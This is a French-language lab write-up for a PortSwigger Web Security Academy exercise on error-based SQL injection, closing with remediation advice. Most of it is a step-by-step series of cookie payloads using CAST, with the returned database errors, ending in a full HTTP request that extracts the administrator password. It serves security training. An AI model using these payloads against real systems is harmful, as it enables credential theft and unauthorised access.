# 💉 Lab : Visible error-based SQL injection
**Catégorie :** Injection SQL (SQLi)
**Type :** Error-Based SQLi (Erreurs Visibles / Data Leakage)
**Plateforme :** PortSwigger Web Security Academy

---

## 📌 Résumé de la Vulnérabilité
L'application est vulnérable à une injection SQL via le cookie `TrackingId`. Le serveur web est mal configuré et affiche les messages d'erreur internes de la base de données de manière très bavarde (Verbose Errors) directement dans le code HTML. En exploitant la fonction `CAST()`, il est possible de forcer la base de données à convertir une chaîne de caractères (comme un mot de passe) en entier (integer). L'opération échoue et l'erreur renvoie la valeur de la chaîne ciblée en clair.

## 🛠️ Preuve de Concept (PoC)
La compromission s'est déroulée en appliquant une méthodologie d'escalade d'erreur rigoureuse via Burp Suite Repeater :

1. **Déclenchement de l'erreur initiale :**
   - Ajout d'une simple quote : `TrackingId=ogAZZfxtOKUELbuJ'`
   - *Résultat :* L'erreur révèle la requête complète : `Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'ogAZZfxtOKUELbuJ''`.

2. **Réparation de la syntaxe :**
   - Ajout d'un commentaire pour ignorer la suite de la requête : `TrackingId=ogAZZfxtOKUELbuJ'--`
   - *Résultat :* Plus d'erreur, la requête est de nouveau valide.

3. **Tentative de conversion (CAST) et erreur booléenne :**
   - Injection d'un `CAST` : `TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--`
   - *Résultat :* Erreur indiquant que la condition `AND` doit être une expression booléenne.

4. **Correction de l'expression booléenne :**
   - Ajout d'un comparateur (`1=`) : `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--`
   - *Résultat :* Plus d'erreur, la structure logique est acceptée par le backend.

5. **Ciblage des données et limite de caractères :**
   - Ciblage de la table `users` : `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--`
   - *Résultat :* Erreur de troncature (`Unterminated string literal started at position 95`). La requête est trop longue.

6. **Optimisation du payload et erreur de lignes multiples :**
   - Suppression de la valeur d'origine du cookie pour libérer de l'espace : `TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--`
   - *Résultat :* Nouvelle erreur backend indiquant que la sous-requête retourne plus d'une ligne. `CAST` ne peut convertir qu'une seule valeur à la fois.

7. **Fuite de l'utilisateur (Data Leakage) avec LIMIT :**
   - Ajout de `LIMIT 1` pour forcer un résultat unique : `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
   - *Résultat :* `ERROR: invalid input syntax for type integer: "administrator"`. (Confirmation de la cible).

8. **Extraction finale du mot de passe :**
   - Modification de la colonne ciblée (`password`) : 
     ```http
     GET / HTTP/2
     Host: 0a7a00ed04efc07180dc807e006200cf.web-security-academy.net
     Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--; session=ocLiC8UBC6C0NdkrdP6LW24TmyAlFJWI
     ```
   - *Résultat final :* `ERROR: invalid input syntax for type integer: "yg5ax0dg7au85xxr6ot1"`

*L'utilisation du mot de passe `yg5ax0dg7au85xxr6ot1` a permis de compromettre le compte administrateur.*

## 🛡️ Recommandation de Sécurité
1. **Désactiver la verbosité des erreurs :** Ne jamais renvoyer les messages d'erreurs SQL générés par le backend aux utilisateurs en production. Configurer des erreurs génériques.
2. **Requêtes préparées :** Utiliser des Prepared Statements pour toutes les interactions avec la base de données afin de bloquer les injections de commandes.